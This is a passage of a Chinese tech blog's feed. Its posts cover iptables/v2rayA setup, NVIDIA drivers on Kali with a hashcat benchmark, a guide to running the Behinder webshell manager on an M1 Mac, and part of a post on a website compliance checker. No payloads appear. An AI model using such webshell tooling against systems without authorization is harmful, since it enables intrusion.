的后端以进行适配：</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives --set iptables /usr/sbin/iptables-nft</span><br><span class="line">update-alternatives --set ip6tables /usr/sbin/ip6tables-nft</span><br><span class="line">update-alternatives --set arptables /usr/sbin/arptables-nft</span><br><span class="line">update-alternatives --set ebtables /usr/sbin/ebtables-nft</span><br></pre></td></tr></table></figure><ul><li><strong>如果你想切换回 legacy 版本：</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives --set iptables /usr/sbin/iptables-legacy</span><br><span class="line">update-alternatives --set ip6tables /usr/sbin/ip6tables-legacy</span><br><span class="line">update-alternatives --set arptables /usr/sbin/arptables-legacy</span><br><span class="line">update-alternatives --set ebtables /usr/sbin/ebtables-legacy</span><br></pre></td></tr></table></figure><ul><li><strong>切换后重启即可。</strong></li></ul><h3 id="（二）创建帐号"><a href="#（二）创建帐号" class="headerlink" title="（二）创建帐号"></a>（二）创建帐号</h3><ul><li>如果你通过 2017 端口 如 <a href="http://localhost:2017/">http://localhost:2017</a> 无法访问 UI 界面，请检查你的服务是否已经启动。相关问题接下来进入 UI，本节将介绍 v2rayA 的基本操作流程。</li><li>在第一次进入页面时，你需要创建一个管理员账号，请妥善保管你的用户名密码，如果遗忘，使用 sudo v2raya –reset-password 命令重置</li></ul><h3 id="（三）导入节点"><a href="#（三）导入节点" class="headerlink" title="（三）导入节点"></a>（三）导入节点</h3><ul><li><strong>可以导入节点，也可以导入订阅节点。</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali linux 上安装 NVIDIA 驱动程序</title>
      <link href="//archives/1725243406467/"/>
      <url>//archives/1725243406467/</url>
      
        <content type="html"><![CDATA[<h1 id="kali-linux-上安装-NVIDIA-驱动程序"><a href="#kali-linux-上安装-NVIDIA-驱动程序" class="headerlink" title="kali linux 上安装 NVIDIA 驱动程序"></a>kali linux 上安装 NVIDIA 驱动程序</h1><h3 id="一、更新系统"><a href="#一、更新系统" class="headerlink" title="一、更新系统"></a>一、更新系统</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt -y full-upgrade</span><br><span class="line">sudo apt -y autoremove</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><h3 id="二、查看已安装的显卡，并验证是否用-Nouveau-开源驱动程序"><a href="#二、查看已安装的显卡，并验证是否用-Nouveau-开源驱动程序" class="headerlink" title="二、查看已安装的显卡，并验证是否用 Nouveau 开源驱动程序"></a>二、查看已安装的显卡，并验证是否用 Nouveau 开源驱动程序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lspci | grep -i vga</span><br><span class="line"></span><br><span class="line">#显示结果</span><br><span class="line">01:00.0 VGA compatible controller: NVIDIA Corporation TU106M [GeForce RTX 2060 Mobile] (rev a1)</span><br></pre></td></tr></table></figure><h3 id="三、获取安装有关-iuan-驱动程序的信息，01-00-0-是上面显示显卡的数字"><a href="#三、获取安装有关-iuan-驱动程序的信息，01-00-0-是上面显示显卡的数字" class="headerlink" title="三、获取安装有关 iuan 驱动程序的信息，01:00.0 是上面显示显卡的数字"></a>三、获取安装有关 iuan 驱动程序的信息，01:00.0 是上面显示显卡的数字</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">lspci -s 01:00.0 -v</span><br><span class="line"></span><br><span class="line">#显示结果</span><br><span class="line">    #省略部分</span><br><span class="line">    ......</span><br><span class="line">    Kernel driver in use: nouveau  #nouveau</span><br><span class="line">    Kernel modules: nouveau   #nouveau</span><br></pre></td></tr></table></figure><h3 id="四、使用-APT-包管理器将驱动程序和-CUDA-Toolkit-安装以下命令"><a href="#四、使用-APT-包管理器将驱动程序和-CUDA-Toolkit-安装以下命令" class="headerlink" title="四、使用 APT 包管理器将驱动程序和 CUDA Toolkit 安装以下命令"></a>四、使用 APT 包管理器将驱动程序和 CUDA Toolkit 安装以下命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install nvidia-driver nvidia-cuda-toolkit</span><br></pre></td></tr></table></figure><h3 id="五、重启计算机生效"><a href="#五、重启计算机生效" class="headerlink" title="五、重启计算机生效"></a>五、重启计算机生效</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure><h3 id="六、验证系统是否正在使用-NVIDIA-驱动而不是-Nouvear"><a href="#六、验证系统是否正在使用-NVIDIA-驱动而不是-Nouvear" class="headerlink" title="六、验证系统是否正在使用 NVIDIA 驱动而不是 Nouvear"></a>六、验证系统是否正在使用 NVIDIA 驱动而不是 Nouvear</h3><ul><li><h4 id="方法一：终端执行命令"><a href="#方法一：终端执行命令" class="headerlink" title="方法一：终端执行命令"></a>方法一：终端执行命令</h4></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">lspci -s 01:00.0 -v #数字是上面得到结果</span><br><span class="line"></span><br><span class="line">#显示结果</span><br><span class="line">    #省略部分</span><br><span class="line">    .......</span><br><span class="line">    Kernel driver in use: nvidia   #nvidia</span><br><span class="line">    Kernel modules: nvidia    #nvidia</span><br></pre></td></tr></table></figure><ul><li><h4 id="方法二：设置-关于"><a href="#方法二：设置-关于" class="headerlink" title="方法二：设置 -&gt; 关于"></a>方法二：设置 -&gt; 关于</h4></li><li><h4 id="方法三：打开-NVNIDA-settings"><a href="#方法三：打开-NVNIDA-settings" class="headerlink" title="方法三：打开 NVNIDA settings"></a>方法三：打开 NVNIDA settings</h4></li></ul><p><img src="/../images/kali&linux%E4%B8%8A%E5%AE%89%E8%A3%85NVIDIA%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F/image-20240902101650806978.png" alt="点击放大图片"></p><h3 id="七、使用-HashCAT-执行基准测试"><a href="#七、使用-HashCAT-执行基准测试" class="headerlink" title="七、使用 HashCAT 执行基准测试"></a>七、使用 HashCAT 执行基准测试</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install hashcat</span><br><span class="line">hashcat -b | uniq</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 归纳 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MacBookAirM1安装冰蝎v4.1</title>
      <link href="//archives/1725242614801/"/>
      <url>//archives/1725242614801/</url>
      
        <content type="html"><![CDATA[<h1 id="MacBookAirM1安装冰蝎v4-1"><a href="#MacBookAirM1安装冰蝎v4-1" class="headerlink" title="MacBookAirM1安装冰蝎v4.1"></a>MacBookAirM1安装冰蝎v4.1</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><ul><li><strong>在使用 MacBook 安装一些渗透测试工具时，对于 webshell 管理工具安装很是麻烦，对于 菜刀 蚁剑，似乎都没有适合 mac 的版本，好像也只有冰蝎才适用于 MacBook，但是在安装时，因为冰蝎的更新，取消了内置 javafx 框架版本，导致 M1 不兼容此版本，于是在网上搜索解决办法，但是都没有具体的解决方法，于是总结网上的教程以及 GitHub 上的反馈，写出此教程。</strong></li><li><strong>在运行时报以下错误，便是缺少 javafx 内置库，按此教程操作即可。</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">java -jar Behinder.jar</span><br><span class="line">12月 1, 2023 12:59:33 下午 com.sun.javafx.application.PlatformImpl startup</span><br><span class="line">警告: Unsupported JavaFX configuration: classes were loaded from &#x27;unnamed module @22de69b2&#x27;</span><br><span class="line">Loading library prism_es2 from resource failed: java.lang.UnsatisfiedLinkError: Can&#x27;t load library: /Users/xxxxxx/.openjfx/cache/19+11/aarch64/libprism_es2.dylib</span><br><span class="line">java.lang.UnsatisfiedLinkError: Can&#x27;t load library: /Users/xxxxx/.openjfx/cache/19+11/aarch64/libprism_es2.dylib</span><br><span class="line">    at java.base/java.lang.ClassLoader.loadLibrary(ClassLoader.java:2398)</span><br><span class="line">    at java.base/java.lang.Runtime.load0(Runtime.java:785)</span><br><span class="line">    at java.base/java.lang.System.load(System.java:1979)</span><br><span class="line">    at com.sun.glass.utils.NativeLibLoader.installLibraryFromResource(NativeLibLoader.java:217)</span><br><span class="line">    at com.sun.glass.utils.NativeLibLoader.loadLibraryFromResource(NativeLibLoader.java:197)</span><br><span class="line">    at com.sun.glass.utils.NativeLibLoader.loadLibraryInternal(NativeLibLoader.java:138)</span><br><span class="line">    at com.sun.glass.utils.NativeLibLoader.loadLibrary(NativeLibLoader.java:54)</span><br><span class="line">    at com.sun.prism.es2.ES2Pipeline.lambda$static$0(ES2Pipeline.java:63)</span><br><span class="line">    at java.base/java.security.AccessController.doPrivileged(AccessController.java:318)</span><br><span class="line">    at com.sun.prism.es2.ES2Pipeline.&lt;clinit&gt;(ES2Pipeline.java:52)</span><br><span class="line">    at java.base/java.lang.Class.forName0(Native Method)</span><br><span class="line">    at java.base/java.lang.Class.forName(Class.java:383)</span><br><span class="line">    at java.base/java.lang.Class.forName(Class.java:376)</span><br><span class="line">    at com.sun.prism.GraphicsPipeline.createPipeline(GraphicsPipeline.java:218)</span><br><span class="line">    at com.sun.javafx.tk.quantum.QuantumRenderer$PipelineRunnable.init(QuantumRenderer.java:92)</span><br><span class="line">    at com.sun.javafx.tk.quantum.QuantumRenderer$PipelineRunnable.run(QuantumRenderer.java:125)</span><br><span class="line">    at java.base/java.lang.Thread.run(Thread.java:833)</span><br><span class="line">Loading library prism_sw from resource failed: java.lang.UnsatisfiedLinkError: Can&#x27;t load library: /Users/xxxxx/.openjfx/cache/19+11/aarch64/libprism_sw.dylib</span><br><span class="line">java.lang.UnsatisfiedLinkError: Can&#x27;t load library: /Users/xxxx/.openjfx/cache/19+11/aarch64/libprism_sw.dylib</span><br><span class="line">    at java.base/java.lang.ClassLoader.loadLibrary(ClassLoader.java:2398)</span><br><span class="line">    at java.base/java.lang.Runtime.load0(Runtime.java:785)</span><br><span class="line">    at java.base/java.lang.System.load(System.java:1979)</span><br><span class="line">    at com.sun.glass.utils.NativeLibLoader.installLibraryFromResource(NativeLibLoader.java:217)</span><br><span class="line">    at com.sun.glass.utils.NativeLibLoader.loadLibraryFromResource(NativeLibLoader.java:197)</span><br><span class="line">    at com.sun.glass.utils.NativeLibLoader.loadLibraryInternal(NativeLibLoader.java:138)</span><br><span class="line">    at com.sun.glass.utils.NativeLibLoader.loadLibrary(NativeLibLoader.java:54)</span><br><span class="line">    at com.sun.prism.sw.SWPipeline.lambda$static$0(SWPipeline.java:43)</span><br><span class="line">    at java.base/java.security.AccessController.doPrivileged(AccessController.java:318)</span><br><span class="line">    at com.sun.prism.sw.SWPipeline.&lt;clinit&gt;(SWPipeline.java:42)</span><br><span class="line">    at java.base/java.lang.Class.forName0(Native Method)</span><br><span class="line">    at java.base/java.lang.Class.forName(Class.java:383)</span><br><span class="line">    at java.base/java.lang.Class.forName(Class.java:376)</span><br><span class="line">    at com.sun.prism.GraphicsPipeline.createPipeline(GraphicsPipeline.java:218)</span><br><span class="line">    at com.sun.javafx.tk.quantum.QuantumRenderer$PipelineRunnable.init(QuantumRenderer.java:92)</span><br><span class="line">    at com.sun.javafx.tk.quantum.QuantumRenderer$PipelineRunnable.run(QuantumRenderer.java:125)</span><br><span class="line">    at java.base/java.lang.Thread.run(Thread.java:833)</span><br><span class="line">Graphics Device initialization failed for :  es2, sw</span><br><span class="line">Error initializing QuantumRenderer: no suitable pipeline found</span><br><span class="line">java.lang.RuntimeException: java.lang.RuntimeException: Error initializing QuantumRenderer: no suitable pipeline found</span><br><span class="line">    at com.sun.javafx.tk.quantum.QuantumRenderer.getInstance(QuantumRenderer.java:283)</span><br><span class="line">    at com.sun.javafx.tk.quantum.QuantumToolkit.init(QuantumToolkit.java:253)</span><br><span class="line">    at com.sun.javafx.tk.Toolkit.getToolkit(Toolkit.java:268)</span><br><span class="line">    at com.sun.javafx.application.PlatformImpl.startup(PlatformImpl.java:291)</span><br><span class="line">    at com.sun.javafx.application.PlatformImpl.startup(PlatformImpl.java:163)</span><br><span class="line">    at com.sun.javafx.application.LauncherImpl.startToolkit(LauncherImpl.java:659)</span><br><span class="line">    at com.sun.javafx.application.LauncherImpl.launchApplication1(LauncherImpl.java:679)</span><br><span class="line">    at com.sun.javafx.application.LauncherImpl.lambda$launchApplication$2(LauncherImpl.java:196)</span><br><span class="line">    at java.base/java.lang.Thread.run(Thread.java:833)</span><br><span class="line">Caused by: java.lang.RuntimeException: Error initializing QuantumRenderer: no suitable pipeline found</span><br><span class="line">    at com.sun.javafx.tk.quantum.QuantumRenderer$PipelineRunnable.init(QuantumRenderer.java:95)</span><br><span class="line">    at com.sun.javafx.tk.quantum.QuantumRenderer$PipelineRunnable.run(QuantumRenderer.java:125)</span><br><span class="line">    ... 1 more</span><br><span class="line">Graphics Device initialization failed for :  es2, sw</span><br><span class="line">Error initializing QuantumRenderer: no suitable pipeline found</span><br><span class="line">java.lang.RuntimeException: java.lang.RuntimeException: Error initializing QuantumRenderer: no suitable pipeline found</span><br><span class="line">    at com.sun.javafx.tk.quantum.QuantumRenderer.getInstance(QuantumRenderer.java:283)</span><br><span class="line">    at com.sun.javafx.tk.quantum.QuantumToolkit.init(QuantumToolkit.java:253)</span><br><span class="line">    at com.sun.javafx.tk.Toolkit.getToolkit(Toolkit.java:268)</span><br><span class="line">    at javafx.stage.Screen.&lt;clinit&gt;(Screen.java:74)</span><br><span class="line">    at javafx.stage.Window.&lt;init&gt;(Window.java:1504)</span><br><span class="line">    at javafx.stage.Stage.&lt;init&gt;(Stage.java:256)</span><br><span class="line">    at javafx.stage.Stage.&lt;init&gt;(Stage.java:244)</span><br><span class="line">    at javafx.scene.control.HeavyweightDialog$1.&lt;init&gt;(HeavyweightDialog.java:52)</span><br><span class="line">    at javafx.scene.control.HeavyweightDialog.&lt;init&gt;(HeavyweightDialog.java:52)</span><br><span class="line">    at javafx.scene.control.Dialog.&lt;init&gt;(Dialog.java:252)</span><br><span class="line">    at javafx.scene.control.Alert.&lt;init&gt;(Alert.java:247)</span><br><span class="line">    at javafx.scene.control.Alert.&lt;init&gt;(Alert.java:222)</span><br><span class="line">    at net.rebeyond.behinder.utils.Utils.getAlert(Utils.java:85)</span><br><span class="line">    at net.rebeyond.behinder.utils.Utils.showErrorMessage(Utils.java:1341)</span><br><span class="line">    at net.rebeyond.behinder.ui.Main.main(Main.java:57)</span><br><span class="line">    at net.rebeyond.behinder.ui.Launcher.main(Launcher.java:7)</span><br><span class="line">Caused by: java.lang.RuntimeException: Error initializing QuantumRenderer: no suitable pipeline found</span><br><span class="line">    at com.sun.javafx.tk.quantum.QuantumRenderer$PipelineRunnable.init(QuantumRenderer.java:95)</span><br><span class="line">    at com.sun.javafx.tk.quantum.QuantumRenderer$PipelineRunnable.run(QuantumRenderer.java:125)</span><br><span class="line">    at java.base/java.lang.Thread.run(Thread.java:833)</span><br><span class="line">java.lang.ExceptionInInitializerError</span><br><span class="line">    at javafx.stage.Window.&lt;init&gt;(Window.java:1504)</span><br><span class="line">    at javafx.stage.Stage.&lt;init&gt;(Stage.java:256)</span><br><span class="line">    at javafx.stage.Stage.&lt;init&gt;(Stage.java:244)</span><br><span class="line">    at javafx.scene.control.HeavyweightDialog$1.&lt;init&gt;(HeavyweightDialog.java:52)</span><br><span class="line">    at javafx.scene.control.HeavyweightDialog.&lt;init&gt;(HeavyweightDialog.java:52)</span><br><span class="line">    at javafx.scene.control.Dialog.&lt;init&gt;(Dialog.java:252)</span><br><span class="line">    at javafx.scene.control.Alert.&lt;init&gt;(Alert.java:247)</span><br><span class="line">    at javafx.scene.control.Alert.&lt;init&gt;(Alert.java:222)</span><br><span class="line">    at net.rebeyond.behinder.utils.Utils.getAlert(Utils.java:85)</span><br><span class="line">    at net.rebeyond.behinder.utils.Utils.showErrorMessage(Utils.java:1341)</span><br><span class="line">    at net.rebeyond.behinder.ui.Main.main(Main.java:57)</span><br><span class="line">    at net.rebeyond.behinder.ui.Launcher.main(Launcher.java:7)</span><br><span class="line">Caused by: java.lang.RuntimeException: No toolkit found</span><br><span class="line">    at com.sun.javafx.tk.Toolkit.getToolkit(Toolkit.java:280)</span><br><span class="line">    at javafx.stage.Screen.&lt;clinit&gt;(Screen.java:74)</span><br><span class="line">    ... 12 more</span><br></pre></td></tr></table></figure><h2 id="一、下载所需文件"><a href="#一、下载所需文件" class="headerlink" title="一、下载所需文件"></a>一、下载所需文件</h2><ul><li><strong>冰蝎：</strong><a href="https://github.com/rebeyond/Behinder/releases/tag/Behinder_v4.1%E3%80%90t00ls%E4%B8%93%E7%89%88%E3%80%91">https://github.com/rebeyond/Behinder/releases/tag/Behinder_v4.1%E3%80%90t00ls%E4%B8%93%E7%89%88%E3%80%91</a></li><li><strong>javafx：</strong><a href="https://gluonhq.com/products/javafx/">https://gluonhq.com/products/javafx/</a><br><img src="/../images/MacBookAirM1%E5%AE%89%E8%A3%85%E5%86%B0%E8%9D%8Ev4.1/image-20240902095718015959.png" alt="image-20231202233440726"></li><li><strong>java 下载：</strong><a href="https://www.oracle.com/cn/java/technologies/downloads/#jdk17-mac">Java Downloads | Oracle 中国</a><br><img src="/../images/MacBookAirM1%E5%AE%89%E8%A3%85%E5%86%B0%E8%9D%8Ev4.1/image-20240902095729820783-0960382.png" alt="image-20231202233604246"></li></ul><h2 id="二、安装配置"><a href="#二、安装配置" class="headerlink" title="二、安装配置"></a>二、安装配置</h2><h3 id="1、安装-java"><a href="#1、安装-java" class="headerlink" title="1、安装 java"></a>1、安装 java</h3><p><strong>安装后查看版本</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">    java -version</span><br></pre></td></tr></table></figure><p><img src="/../images/MacBookAirM1%E5%AE%89%E8%A3%85%E5%86%B0%E8%9D%8Ev4.1/image-20240902095735470569.png" alt="image-20231202234614203"></p><h3 id="2、将下载好的冰蝎和-javafx-移动至文件夹（随意）"><a href="#2、将下载好的冰蝎和-javafx-移动至文件夹（随意）" class="headerlink" title="2、将下载好的冰蝎和 javafx 移动至文件夹（随意）"></a>2、将下载好的冰蝎和 javafx 移动至文件夹（随意）</h3><p><img src="/../images/MacBookAirM1%E5%AE%89%E8%A3%85%E5%86%B0%E8%9D%8Ev4.1/image-20240902095900865486.png" alt="image-20231202233928785"></p><h3 id="3、在冰蝎文件夹打开终端"><a href="#3、在冰蝎文件夹打开终端" class="headerlink" title="3、在冰蝎文件夹打开终端"></a>3、在冰蝎文件夹打开终端</h3><p><img src="/../images/MacBookAirM1%E5%AE%89%E8%A3%85%E5%86%B0%E8%9D%8Ev4.1/image-20240902095913833205.png" alt="image-20231202234011696"></p><h3 id="4、运行"><a href="#4、运行" class="headerlink" title="4、运行"></a>4、运行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#运行命令</span><br><span class="line">java --module-path /Users/mawu/tools/javafx-sdk-17.0.9/lib --add-modules=javafx.base,javafx.controls,javafx.fxml,javafx.graphics,javafx.media,javafx.swing,javafx.web -jar Behinder.jar</span><br><span class="line"></span><br><span class="line">#对上述命令解释</span><br><span class="line">java --module-path /javafx路径/lib -add-modules=avafx.base,javafx.controls,javafx.fxml,javafx.graphics,javafx.media,javafx.swing,javafx.web -jar 冰蝎名字.jar</span><br></pre></td></tr></table></figure><p><img src="/../images/MacBookAirM1%E5%AE%89%E8%A3%85%E5%86%B0%E8%9D%8Ev4.1/image-20240902095930086273.png" alt="image-20231202234152684"></p><h2 id="三、创建快捷图标"><a href="#三、创建快捷图标" class="headerlink" title="三、创建快捷图标"></a>三、创建快捷图标</h2><h3 id="1、打开-自动操作-应用程序"><a href="#1、打开-自动操作-应用程序" class="headerlink" title="1、打开 自动操作 应用程序"></a>1、打开 自动操作 应用程序</h3><p><img src="/../images/MacBookAirM1%E5%AE%89%E8%A3%85%E5%86%B0%E8%9D%8Ev4.1/image-20240902095948115041.png" alt="image-20231202234729037"></p><h3 id="2、选择-新建文稿"><a href="#2、选择-新建文稿" class="headerlink" title="2、选择 新建文稿"></a>2、选择 新建文稿</h3><p><img src="/../images/MacBookAirM1%E5%AE%89%E8%A3%85%E5%86%B0%E8%9D%8Ev4.1/image-20240902100001489795.png" alt="image-20231202234811794"></p><h3 id="3、选择-应用程序"><a href="#3、选择-应用程序" class="headerlink" title="3、选择 应用程序"></a>3、选择 应用程序</h3><p><img src="/../images/MacBookAirM1%E5%AE%89%E8%A3%85%E5%86%B0%E8%9D%8Ev4.1/image-20240902100014031990.png" alt="image-20231202234905169"></p><h3 id="4、选择-运行-shell-脚本"><a href="#4、选择-运行-shell-脚本" class="headerlink" title="4、选择 运行 shell 脚本"></a>4、选择 运行 shell 脚本</h3><p><img src="/../images/MacBookAirM1%E5%AE%89%E8%A3%85%E5%86%B0%E8%9D%8Ev4.1/image-20240902100027703987.png" alt="image-20231202235045758"></p><h3 id="5、输入-命令（打开冰蝎文件-上面运行冰蝎的命令）"><a href="#5、输入-命令（打开冰蝎文件-上面运行冰蝎的命令）" class="headerlink" title="5、输入 命令（打开冰蝎文件 + 上面运行冰蝎的命令）"></a>5、输入 命令（打开冰蝎文件 + 上面运行冰蝎的命令）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /Users/mawu/tools/Behinder_v4.1 &amp;&amp; java --module-path /Users/mawu/tools/javafx-sdk-17.0.9/lib --add-modules=javafx.base,javafx.controls,javafx.fxml,javafx.graphics,javafx.media,javafx.swing,javafx.web -jar Behinder.jar</span><br></pre></td></tr></table></figure><p><img src="/../images/MacBookAirM1%E5%AE%89%E8%A3%85%E5%86%B0%E8%9D%8Ev4.1/image-20240902100104785538.png" alt="image-20231202235549292"></p><h3 id="6、点击-运行"><a href="#6、点击-运行" class="headerlink" title="6、点击 运行"></a>6、点击 运行</h3><p><img src="/../images/MacBookAirM1%E5%AE%89%E8%A3%85%E5%86%B0%E8%9D%8Ev4.1/image-20240902100127610778.png" alt="image-20231202235708574"></p><p><img src="/../images/MacBookAirM1%E5%AE%89%E8%A3%85%E5%86%B0%E8%9D%8Ev4.1/image-20240902100148828390.png" alt="image-20231202235639071"></p><h3 id="7、ctrl-s-保存"><a href="#7、ctrl-s-保存" class="headerlink" title="7、ctrl + s 保存"></a>7、ctrl + s 保存</h3><p><img src="/../images/MacBookAirM1%E5%AE%89%E8%A3%85%E5%86%B0%E8%9D%8Ev4.1/image-20240902100204688652.png" alt="image-20231202235802372"></p><h3 id="8、更换图标方式"><a href="#8、更换图标方式" class="headerlink" title="8、更换图标方式"></a>8、更换图标方式</h3><ol><li><strong>打开应用程序 右键 点击 显示简介</strong><br><img src="/../images/MacBookAirM1%E5%AE%89%E8%A3%85%E5%86%B0%E8%9D%8Ev4.1/image-20240902100215962275.png" alt="image-20231203000204870"></li><li><strong>拖拽图标</strong><br><img src="/../images/MacBookAirM1%E5%AE%89%E8%A3%85%E5%86%B0%E8%9D%8Ev4.1/image-20240902100228178845.png" alt="image-20231203000500062"></li><li><strong>成功</strong><br><img src="/../images/MacBookAirM1%E5%AE%89%E8%A3%85%E5%86%B0%E8%9D%8Ev4.1/image-20240902100243530953.png" alt="image-20231203000541736"></li></ol>]]></content>
      
      
      <categories>
          
          <category> 问题解决 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【开发】网站批量检测工具 V1.0.2</title>
      <link href="//archives/1725241458891/"/>
      <url>//archives/1725241458891/</url>
      
        <content type="html"><![CDATA[<h1 id="网站批量检测工具-V1-0-2"><a href="#网站批量检测工具-V1-0-2" class="headerlink" title="网站批量检测工具 V1.0.2"></a>网站批量检测工具 V1.0.2</h1><h2 id="开发背景"><a href="#开发背景" class="headerlink" title="开发背景"></a>开发背景</h2><p>在本人实习期间，面临了对大量本地网站进行备案信息和内容合规性检查的挑战。这些网站的数量巨大，而手动检查方法耗时且容易遗漏，特别是在频繁变化的网络环境中。同时，由于网站运营状况的不断变化，以及黑客入侵的不定时等不可预测的情况，需要及时而有效地监测网站状态。</p><p>面对这一实际问题，决定开发一款工具来提高这一流程的效率和准确性。这款工具旨在自动化 ICP 备案信息和公安备案信息的检测，能够使网信工作者快速了解网站的合规性。通过定期的批量检测，网信工作者可以更及时地发现任何潜在的违规情况，包括色情、赌博等违法内容，从而使网工作者更好地维护网络安全。</p><p>*这个项目的开发背景源于对网站管理工作的实际需求，目的是为了提高工作效率、减轻人工负担，同时保障了网站合规运营的要求。通过自动化的方式，使得原本耗时繁琐的检查过程变得更为简便和迅速，同时减少了人为错误的可能性。这不仅对网信办的工作有着积极的促进作用，也为其他类似需求的机构和个人提供了一种高效的解决方案。</p><p>我相信，通过不断地优化和完善，这款工具将成为网站合规运营管理者的重要助手，<strong>同时也为维护网络空间的清朗和安全贡献一份力量。</strong></p><h2 id="项目概述"><a href="#项目概述" class="headerlink" title="项目概述"></a>项目概述</h2><p><strong>该项目是一个基于 PySide6 和 python 异步编程及多线程的网站批量检测工具。通过读取 Excel 文件中的 URL 列表，使用多线程和异步任务进行网站信息的批量爬取。该工具主要检测网站的基本信息、状态码、网站标题以及可能存在的备案信息。此外，项目还支持调用第三方 API 获取网站的备案信息，包括 ICP 备案和网安备案等单位或个人信息。</strong></p><h2 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h2><ol><li><strong>批量网站检测：</strong> 该工具主要用于批量检测多个网站的基本信息，包括网站标题、状态码、底部悬挂的 ICP 备案信息和网安备案信息等。用户可以通过输入 Excel 表格路径，将待检测的网站列在表格的第一列中。</li><li><strong>多线程和异步请求：</strong> 采用多线程和异步请求的技术，实现对多个网站的并发检测，提高检测效率。用户可以根据需求设置最大线程数，以适应不同的网络环境和性能需求。</li><li><strong>API 调用功能：</strong> 工具内置了 API 调用功能，用户可以选择是否开启。通过调用第三方服务商的 API，获取更详细的 ICP 备案和网安备案等信息，进一步丰富了网站检测的数据。</li><li><strong>友好的图形用户界面（GUI）:</strong> 工具采用 PySide6 